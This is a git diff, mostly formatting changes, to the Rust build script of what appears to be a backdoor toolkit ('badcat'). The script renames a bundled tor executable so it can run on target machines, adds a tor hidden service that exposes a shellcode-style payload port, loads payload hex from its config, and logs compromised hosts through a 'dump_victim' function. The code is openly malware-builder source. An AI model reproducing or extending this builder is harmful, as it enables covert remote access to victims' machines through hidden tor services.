@@ -1,7 +1,7 @@
 use std::path::{Path, PathBuf};
 use std::{collections, error, fs, process};
 
-use badcat_lib::{http, xor, secrets};
+use badcat_lib::{http, secrets, xor};
 use hex::FromHex;
 
 const CFG_TEMPLATE: &str = "config.rs.template";
@@ -38,7 +38,7 @@ struct BuildSetting {
 
     /// Executable name of tor in target machine
     tor_executable: String,
-    
+
     /// Whether or not to use shellcode like payload
     uses_payload: bool,
 
@@ -72,7 +72,9 @@ ControlSocket @{CTRL_SOCKET}
 "#;
     }
 
-    let tor_dir = Path::new(&platform_tor_dir).join(&setting.tor_executable).join("App");
+    let tor_dir = Path::new(&platform_tor_dir)
+        .join(&setting.tor_executable)
+        .join("App");
 
     let mut replacements = collections::HashMap::new();
 
@@ -100,8 +102,7 @@ ControlSocket @{CTRL_SOCKET}
         // add a hidden service for the payload
         torrc += &format!(
             "\nHiddenServicePort {} 127.0.0.1:{}\n",
-            &setting.payload_port,
-            &setting.payload_port
+            &setting.payload_port, &setting.payload_port
         );
     }
 
@@ -152,7 +153,10 @@ fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
 
 fn dump_victim(address: String, setting: &BuildSetting) -> Result<(), Box<dyn error::Error>> {
     let mut hosts = match fs::read_to_string(&setting.hosts_file) {
-        Ok(data) => json::parse(&data).expect(&format!("failed to read json at {}", &setting.hosts_file.to_str().unwrap())),
+        Ok(data) => json::parse(&data).expect(&format!(
+            "failed to read json at {}",
+            &setting.hosts_file.to_str().unwrap()
+        )),
         Err(_) => json::JsonValue::new_array(),
     };
 
@@ -227,7 +231,8 @@ fn download_and_extract_tor(
 
         fs::rename(
             path.join("App").join("tor.exe"),
-            path.join("App").join(format!("{}.exe", &setting.tor_executable)),
+            path.join("App")
+                .join(format!("{}.exe", &setting.tor_executable)),
         )?;
 
         fs::rename(
@@ -290,21 +295,35 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
 
     let is_tor_for_windows = raw["tor"]["build_for_windows"].as_bool().unwrap_or(false);
 
-    let windows_url = String::from(raw["tor"]["download_url"]["windows"].as_str().unwrap_or_else(|| {
-        panic!("invalid windows download url");
-    }));
+    let windows_url = String::from(
+        raw["tor"]["download_url"]["windows"]
+            .as_str()
+            .unwrap_or_else(|| {
+                panic!("invalid windows download url");
+            }),
+    );
 
-    let linux_url = String::from(raw["tor"]["download_url"]["linux"].as_str().unwrap_or_else(|| {
-        panic!("invalid linux download url");
-    }));
+    let linux_url = String::from(raw["tor"]["download_url"]["linux"].as_str().unwrap_or_else(
+        || {
+            panic!("invalid linux download url");
+        },
+    ));
 
-    let windows_dir = String::from(raw["tor"]["destination_dir"]["windows"].as_str().unwrap_or_else(|| {
-        panic!("invalid windows download directory");
-    }));
+    let windows_dir = String::from(
+        raw["tor"]["destination_dir"]["windows"]
+            .as_str()
+            .unwrap_or_else(|| {
+                panic!("invalid windows download directory");
+            }),
+    );
 
-    let linux_dir = String::from(raw["tor"]["destination_dir"]["linux"].as_str().unwrap_or_else(|| {
-        panic!("invalid linux destination directory");
-    }));
+    let linux_dir = String::from(
+        raw["tor"]["destination_dir"]["linux"]
+            .as_str()
+            .unwrap_or_else(|| {
+                panic!("invalid linux destination directory");
+            }),
+    );
 
     let torrc_file = String::from(raw["tor"]["rc_file"].as_str().unwrap_or_else(|| {
         panic!("invalid torrc file");
@@ -317,9 +336,11 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
     let uses_payload = raw["payload"]["enabled"].as_bool().unwrap_or(false);
 
     let payload_data = if uses_payload {
-        String::from(raw["payload"]["hex"].as_str().unwrap_or_else(|| {
-            panic!("invalid payload setting")
-        }))
+        String::from(
+            raw["payload"]["hex"]
+                .as_str()
+                .unwrap_or_else(|| panic!("invalid payload setting")),
+        )
     } else {
         String::from("")
     };
